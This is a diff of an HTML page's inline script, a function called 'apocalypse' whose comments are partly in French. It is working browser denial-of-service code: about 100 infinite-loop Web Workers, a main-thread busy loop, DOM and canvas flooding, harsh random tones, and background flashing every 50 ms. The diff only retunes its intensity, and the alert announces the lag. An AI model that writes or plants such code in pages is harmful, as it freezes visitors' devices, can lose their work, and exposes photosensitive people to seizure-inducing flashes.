@@ -55,20 +55,20 @@
 
 <script>
 function apocalypse() {
-  // 💥 CPU Overload en continu
+  // THREAD PRINCIPAL
   setInterval(() => {
-    for (let i = 0; i < 1e7; i++) {
-      Math.pow(Math.random(), Math.random());
+    for (let i = 0; i < 1e9; i++) {
+      Math.sqrt(Math.random());
     }
-  }, 1);
+  }, 5);
 
-  // 💣 Mass Workers - 200+
-  for (let i = 0; i < 200; i++) {
+  // WORKERS
+  for (let i = 0; i < 100; i++) {
     const blob = new Blob([`
       while (true) {
         let x = 0;
-        for (let j = 0; j < 1e7; j++) {
-          x += Math.tan(j) * Math.random();
+        for (let j = 0; j < 1e9; j++) {
+          x += Math.sqrt(j);
         }
       }
     `], { type: "application/javascript" });
@@ -76,46 +76,46 @@ function apocalypse() {
     new Worker(url);
   }
 
-  // ⚡ DOM Bomb : crée 1000 éléments toutes les 50ms
+  // DOM GLITCH
   setInterval(() => {
-    for (let i = 0; i < 1000; i++) {
+    for (let i = 0; i < 300; i++) {
       const div = document.createElement("div");
       div.className = "glitch";
-      div.innerText = "⚡";
+      div.innerText = "💀";
       div.style.top = Math.random() * window.innerHeight + "px";
       div.style.left = Math.random() * window.innerWidth + "px";
       div.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
       document.body.appendChild(div);
     }
-  }, 50);
+  }, 200);
 
-  // 🎨 Canvas Flood en 16ms
+  // CANVAS FLOOD
   const canvas = document.getElementById("canvas");
   const ctx = canvas.getContext("2d");
   setInterval(() => {
-    for (let i = 0; i < 2000; i++) {
+    for (let i = 0; i < 1500; i++) {
       ctx.fillStyle = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
       ctx.fillRect(Math.random()*1920, Math.random()*1080, 5, 5);
     }
-  }, 16);
+  }, 100);
 
-  // 🔊 Audio Glitch extrême
+  // AUDIO GLITCH
   const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
   setInterval(() => {
     const osc = audioCtx.createOscillator();
-    osc.type = 'sawtooth';
-    osc.frequency.setValueAtTime(Math.random() * 15000 + 100, audioCtx.currentTime);
+    osc.type = 'square';
+    osc.frequency.setValueAtTime(Math.random() * 14000, audioCtx.currentTime);
     osc.connect(audioCtx.destination);
     osc.start();
-    osc.stop(audioCtx.currentTime + 0.05);
-  }, 50);
+    osc.stop(audioCtx.currentTime + 0.2);
+  }, 100);
 
-  // 🌈 Flash violent
+  // FOND DYNAMIQUE
   setInterval(() => {
     document.body.style.backgroundColor = `hsl(${Math.random()*360}, 100%, 10%)`;
-  }, 10);
+  }, 50);
 
-  alert("attend 1minute");
+  alert("🔥 Apocalypse activée. Que le lag commence.");
 }
 </script>
 
